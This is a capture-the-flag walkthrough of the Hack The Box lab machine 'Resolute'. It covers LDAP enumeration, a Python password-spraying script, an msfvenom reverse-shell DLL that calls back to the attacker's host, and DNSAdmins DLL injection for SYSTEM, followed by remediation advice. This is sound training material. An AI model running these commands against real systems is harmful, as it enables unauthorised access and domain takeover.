---
layout: post
title:  "HTB: Resolute Walkthrough"
categories: writeups HTB
permalink: /:categories/:title
---

![Resolute Logo](../../assets/img/writeups/htb/resolute/info_card.png)

Date: 5/30/2020   
Author: n0tAc0p  

Table of Contents
1. TOC 
{:toc} 

### TL;DR

`Plaintext password in LDAP Object --> Plaintext password in Powershell File --> DNS DLL Plugin Exploit`

### Recon and Enumeration

As always, we started with a masscan and followed that up with a more detailed nmap scan on the "important" ports (really anything under 10000).

{:refdef: style="text-align: center;"}
![Detailed Nmap](../../assets/img/writeups/htb/resolute/detailed_scan.png)
{: refdef}

Open Ports:

- 53 (DNS)
- 445 (Samba)
- 464 (Kerberos)
- 3268/9 (LDAP)
- 5985 (Windows Remote Management)

These services gave us confidence in our assumption that this box was a domain controller. The domain name `nmap` gave us was `megabank.local`. We added this to our /etc/hosts file for future use.

#### Raw LDAP Search

I learned a great many things while working on Forest a while ago. Possibly the most important being how to query LDAP. I queried the entire LDAP "Tree" of the Domain Controller, and looked specifically at the users. We put all found usernames in a file for future use as well.

Queries Used:

~~~bash
ldapsearch -x -h megabank.local -b "dc=megabank,dc=local"
# To get Users only (less total records to look through)
ldapsearch -x -h megabank.local -b "cn=Users,dc=megabank,dc=local"
~~~

While searching through the users, I found the description of user `mark` quite interesting.

{:refdef: style="text-align: center;"}
![LDAP Plaintext Password](../../assets/img/writeups/htb/resolute/password_description.png)
{: refdef}

How nice they left a default password in the description of the user!! We headed over to [evil-winrm](https://github.com/Hackplayers/evil-winrm){:target="_blank"} and attempted to login to the domain as user `mark`. If unaware, evil-winrm is a program that abuses the Windows Remote Management protocol and gives us a pretty shell to use to connect to a box **IF** we have valid credentials.

{:refdef: style="text-align: center;"}
![Evil Failure](../../assets/img/writeups/htb/resolute/evil_error.png)
{: refdef}

I retyped the password and command a few times to make sure they were correct. But to no avail. It looked like `mark` was smart and changed his password. The next logical step I thought of was to password spray with the users I found when doing the LDAP query. That is, try that password for every user on the box and hope it works.

### Initial Foothold and User

I wrote a python script to do this, since I did not feel like manually checking each person. Laziness is a thing :)

~~~python
import os
import sys

userList = sys.argv[1]
password = sys.argv[2]

with open(userList, "r") as f:
    while f:
        username = f.readline().strip()
        os.system("evil-winrm -i 10.10.10.169 -u {} -p {}".format(username, password))
print("Terminating...")
~~~

After running for a few minutes, a successful connection was formed with user `melanie`. We now had credentials for the User on the box, and can find the user.txt file in `\Users\melanie\Desktop`

{:refdef: style="text-align: center;"}
![Melanie User](../../assets/img/writeups/htb/resolute/melanie_user.png)
{: refdef}

{:refdef: style="text-align: center;"}
![User Hash](../../assets/img/writeups/htb/resolute/user_hash.png)
{: refdef}

#### Hunting for Hidden Files

After spending a few minutes on the box, I determined there was some form of anti-virus (probably Windows Defender), becasue I could not run Powershell Scripts, and when I uploaded an exe, it was deleted within seconds.

I also found another user directory for user `ryan`. My best guess at that point was that we had to login as ryan, and escalate from there. What followed was a 2 day search for some way to login as ryan. As I could not find any vulnerable service I could exploit as `melanie` I searched through the box for plaintext passwords. *I should note at this point I checked samba, and found nothing of use either*.

Eventually, after relying on `dir -Force` (which shows all directories, including hidden ones), I found ryan's password in a Powershell Trasnscript file. The file can be found at `\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`.

{:refdef: style="text-align: center;"}
![Power Shell Transcript](../../assets/img/writeups/htb/resolute/pst_transcript.png)
{: refdef}

After taking hours to find the password through manual enumeration, I found a more efficient approach by using `findstr`.

{:refdef: style="text-align: center;"}
![findstr](../../assets/img/writeups/htb/resolute/findstr_ryan.png)
{: refdef}

### Privilege Escalation

We can now use `evil-winrm` to login as `ryan`. Checking what groups he is a part of using `whoami /all`, we see he is part of the DNS Admins group, which seems strange since he is also in a Contractors group.

{:refdef: style="text-align: center;"}
![DNS Admin](../../assets/img/writeups/htb/resolute/ryan_whoami.png)
{: refdef}

A quick google on "windows dns admin exploit" brings up two detailed articles. One by [Dhiraj Sharma](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2){:target="_blank"} which is based on another by [Ired.Team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise){:target="_blank"}. I relied on these articles heavily in sections below.

Essentially, we can inject a DLL into the DNS process, and execute it since `ryan` is a member of the DNS Admin group. 

#### DNS DLL Injection

##### Step 1: Create a DLL Payload

While both articles linked above have information on creating a custom payload, I chose to use `msfvenom` to create one quickly. `msfvenom` is Metasploit's payload generation tool.

Command used to create the payload:  
`msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.15.119 LPORT=9001 -f dll > lamp.dll`

-a = architecture  
-p = payload choice  
-f = file type  

##### Step 2: Host payload on local SMB Server

Following some advice in Sharma's article, I hosted my malicious DLL on a local samba share, using Impackets smbserver.py.

Command to host file:

`sudo python /opt/impacket/examples/smbserver.py myShare .`

This creates a share called "myShare", and it hosts files in the current directory.

##### Step 3: Execute Payload on Domain Controller

Now we have our payload created and hosted, its time to execute it on the Domain Controller. For the exploit to work, we must first set the DNS DLL plugin to be our malicious DLL, then restart the DNS service.

~~~powershell
dnscmd Resolute.megabank.local /config /serverlevelplugindll \\10.10.15.119\myShare\lamp.dll
sc.exe \\10.10.10.169 stop dns
sc.exe \\10.10.10.169 start dns
~~~

If we have a netcat listener on 9001, we *should* get a reverse shell back!

Here is the exploit path on the Domain Controller in picture form.

{:refdef: style="text-align: center;"}
![SMB Logs](../../assets/img/writeups/htb/resolute/exploit_path.png)
{: refdef}

Now that we have a reverse shell, we can navigate to `\Users\Administrator\Documents` and get the root hash!

{:refdef: style="text-align: center;"}
![System Hash](../../assets/img/writeups/htb/resolute/root_user.png)
{: refdef}

*Note that I had to try this multiple times since everyone else on the box was attempting the same exploit. So if you're payload did not work the first time, that may have been the reason*

### Conclusion

#### Fixes

1. Plaintext password in the description of an LDAP User Object  
**Fix: Scrub user desriptions of all plaintext passwords**
2. Reused default password for different users  
**Fix: Change all default password immediately upon login (Although since Ryan was a contractor, he might not have cared about changing it)**
3. Plaintext password in a powershell transcript file  
**Fix: Either remove files from filesystem, or remove access from lower privileged accounts (such as melanie)**
4. DNS DLL Injection gave us SYSTEM privileges  
**Fix: Audit group permissions and watch logs for suspicious changes to the DNS Service (See the articles mentioned for more in depth analysis)**

#### Final Thoughts

For my second Windows box, it was nearly as frustrating as the first. But, I learned a ton as usual, and am excited to move onto more Windows machines in the future. Thanks to `helichopper` for help with the DNS exploitation and for `egre55` for the machine creation. Onto the next one...

*As always, if you have any questions or feedback, please contact me on HTB! I am always looking to improve my writing to make it as clear and concise as possible (while remaining somewhat beginner friendly). Happy Hacking!*

### References

1. Evil-WInRm Github: https://github.com/Hackplayers/evil-winrm
2. Dhiraj Sharma DNS Plugin Exploit: https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2
3. Ired Team DNS Plugin Exploit: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise